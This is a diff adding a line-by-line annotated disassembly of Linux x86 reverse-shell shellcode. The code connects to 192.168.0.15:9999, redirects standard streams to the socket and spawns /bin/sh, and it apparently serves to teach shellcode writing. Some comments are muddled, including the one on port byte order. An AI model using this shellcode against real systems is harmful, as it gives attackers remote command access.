@@ -1,0 +1,37 @@
+0x0804a040 <+0>:		xor    ebx,ebx        ; zero out EBX
+0x0804a042 <+2>:		mul    ebx		        ; multiply EBX with AL and store the result in AL, making AL equal to 0
+0x0804a044 <+4>:		push   ebx            ; push EBX (0x00000000) onto the stack
+0x0804a045 <+5>:		inc    ebx            ; increase EBX by 1
+0x0804a046 <+6>:		push   ebx            ; push EBX (0x00000001) onto the stack
+0x0804a047 <+7>:		push   0x2            ; push 0x00000002 onto the stack
+0x0804a049 <+9>:		mov    ecx,esp        ; move the memory address pointed to by ESP into ECX
+0x0804a04b <+11>:	  mov    al,0x66        ; move the value 0x66 (HEX) / 102 (Decimal) into AL
+0x0804a04d <+13>:	  int    0x80           ; issue the 'socketcall' syscall - number 102 (cat /usr/include/i386-linux-gnu/asm/unistd_32.h)
+
+0x0804a04f <+15>:	    xchg   ebx,eax      ; the syscall will return the socket file descriptor value into EAX, so place that value into EBX, EBX needs to contain this value for the upcoming syscall
+0x0804a050 <+16>:	    pop    ecx          ; pop the value (0x00000002) stored at the memory address pointed to by ESP into ECX. Number 2 in this case represents STDERR of the dup2 function
+0x0804a051 <+17>:	    mov    al,0x3f      ; move the value 0x3f (HEX) / 63 (Decimal) into AL
+0x0804a053 <+19>:	    int    0x80         ; issue the 'dup2' syscall - number 63 (cat /usr/include/i386-linux-gnu/asm/unistd_32.h). This will execute the following C equivalent function of dup2: dup2(client_sockfd, 2);
+0x0804a055 <+21>:	    dec    ecx          ; decrease ECX from 2 to 1
+0x0804a056 <+22>:	    jns    0x804a051 <code+17>   ; jump back to the 0x0804a051 address where another dup2 syscall is being setup for STDOUT - 1 and then STDIN - 0, unless the sign flag is set. If the sign flag is set (e.g. ECX is below 0 = negative value), proceed to the next instruction
+
+0x0804a058 <+24>:	    push   0xf00a8c0    ; push the 4 HEX bytes of c0 (192 in decimal), a8 (168 in decimal), 00 (0 in decimal) and 0f (15 in decimal) onto the stack in reverse order, this is the listener IP address of 192.168.0.15
+0x0804a05d <+29>:	    push   0xf270002    ; push the 4 HEX bytes of 02, 00, 27 and 0f onto the stack. The two bytes (WORD) - 0f and 27 represent the decimal number 3879 (big-endian) or 9999 (little-endian), which is the listener port. The final 0x02 byte represents the first value of the 'addr' struct (the C code is show below), which is 'AF_INET/sin_family' - '2'
+0x0804a062 <+34>:	    mov    ecx,esp      ; move the memory address pointed to by ESP into ECX; ECX needs to point to the above list of three 'addr' struct values
+0x0804a064 <+36>:	    mov    al,0x66      ; move the value 0x66 (HEX) / 102 (Decimal) into AL
+0x0804a066 <+38>:	    push   eax          ; push that value onto the stack; this is the third SYS_CONNECT protocol argument value of 'sizeof(addr)'.
+0x0804a067 <+39>:	    push   ecx          ; push the value of ECX onto the stack; this is the SYS_CONNECT protocol argument value of '(struct sockaddr*) &addr' - the pointer to the three 'addr' struct values
+0x0804a068 <+40>:	    push   ebx          ; push the value of EBX (3) onto the stack; this is the first SYS_CONNECT protocol argument value of 'server_sockfd' - '3'
+0x0804a069 <+41>:	    mov    bl,0x3       ; move the value of 0x3 into EBX; assign the 'SYS_CONNECT' - 'connect()' - '3' function to EBX, EBX needs to contain the type of the socket call
+0x0804a06b <+43>:	    mov    ecx,esp      ; ECX needs to point to the above list of three SYS_CONNECT args pushed onto the stack
+0x0804a06d <+45>:	    int    0x80         ; issue the 'socketcall' syscall - number 102
+
+0x0804a06f <+47>:	    push   edx           ; push the value of EDX (0) onto the stack
+0x0804a070 <+48>:	    push   0x68732f6e    ; push "n/sh" onto the stack
+0x0804a075 <+53>:	    push   0x69622f2f    ; push "//bi" onto the stack
+0x0804a07a <+58>:	    mov    ebx,esp       ; ESP is now pointing to a memory address containing "//bin/sh + 00", so move its value into EBX
+0x0804a07c <+60>:	    push   edx           ; push the value of EDX (0) onto the stack
+0x0804a07d <+61>:	    push   ebx           ; push the memory address of the //bin/sh string + 00 onto the stack
+0x0804a07e <+62>:	    mov    ecx,esp       ; move this memory address from ESP into ECX
+0x0804a080 <+64>:	    mov    al,0xb        ; move the 'execve' syscall number 11 (0x0B in HEX) into AL
+0x0804a082 <+66>:	    int    0x80          ; issue the 'execve' syscall
